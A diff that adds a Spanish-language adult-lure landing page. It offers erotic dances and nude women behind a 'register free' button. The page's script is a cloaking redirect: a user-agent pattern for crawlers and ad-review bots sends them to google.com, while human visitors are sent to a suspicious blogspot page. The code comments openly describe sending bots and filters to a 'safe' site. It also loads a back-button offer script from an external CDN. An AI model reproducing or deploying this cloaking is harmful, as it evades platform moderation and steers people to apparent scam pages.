@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no">
+    <meta name="robots" content="noindex, nofollow">
+    <title>Ennncuentrooos, fooottooos</title>
+    
+    <meta content='https://i.postimg.cc/SQVxd77J/Vista-Uno-Sepia.png' property='og:image'/>
+    
+    <link rel="stylesheet" href="https://cdn.smrt-content.com/assets/1004/css/index.css">
+    <link rel="shortcut icon" href="https://cdn.jmpcdn.com/assets/3420/images/2.ico" type="image/x-icon">
+
+    <script src="https://cdn.smrt-content.com/assets/1004/js/jquery.min.js"></script>
+    <script src="https://cdn.smrt-content.com/assets/1004/js/device.min.js"></script>
+    <script src="https://cdn.smrt-content.com/assets/1004/js/custom.js"></script>
+    <script src="https://cdn.smrt-content.com/assets/1004/js/backoffer.js"></script>
+</head>
+<body>
+
+    <div class="layer"></div>
+
+    <div class="wrap">
+        <div class="step-block">
+            <div class="logo">
+                <img src="" alt="">
+            </div>
+
+            <div class="step-item" style="display: block;">
+                <div class="question-title">
+                Ofrecemos bailes eróticooos y masajes en toda la ciudad. ¿Le gustaría ver nuestra lista de chicaaas y sus fotos?
+                </div>
+                <div class="buttons-block">
+                    <div class="step-btn no-btn tr-next-button tr-b-option">Si</div>
+                    <div class="step-btn yes-btn tr-next-button tr-b-option">No</div>
+                </div>
+            </div>
+
+            <div class="step-item thishide" style="display: none;">
+                <div class="question-title">
+                   ¿Aceptas respetar a las mujeres desnudaaas que verás a continuación? Si estás de acuerdo,  haz clic en CONTINUAR abajo y regístrate GRATIS rellenando el formulario para verlas en directo...
+                </div>
+                <div class="buttons-block">
+                    <a href="javascript:void(0)" id="main-link" class="step-btn submit-btn tr-submit-button showmail">CONTINUAR</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <img src="https://i.ibb.co/fYjv9fP2/ensepiagifj.gif" alt="GIF de fondo" id="VideoBg" style="width: 100%; height: 100%; object-fit: cover; position: fixed; top: 0; left: 0; z-index: -1;">
+
+    <script type="text/javascript">
+        document.getElementById('main-link').addEventListener('click', function(e) {
+            e.preventDefault();
+
+            // 1. Definir los links
+            const linkReal = "https://lasgooglesface.blogspot.com"; // Tu link principal
+            const linkParaBots = "https://google.com";   // Donde enviarás a los bots/filtros
+
+            // 2. Lista de palabras clave que usan los bots en su User-Agent
+            const botPattern = /bot|spider|facebookexternalhit|facebot|crawl|googlebot|slurp|bingbot|lighthouse|adsbot/i;
+            const userAgent = navigator.userAgent;
+
+            // 3. Lógica de redirección
+            if (botPattern.test(userAgent)) {
+                // Si es un bot detectado, va a la web segura
+                window.location.href = linkParaBots;
+            } else {
+                // Si parece un humano, va al link principal
+                window.location.href = linkReal;
+            }
+        });
+
+        (function(w){
+            w.backOfferUrl = '';
+        })(window);
+    </script>
+
+</body>
+</html>
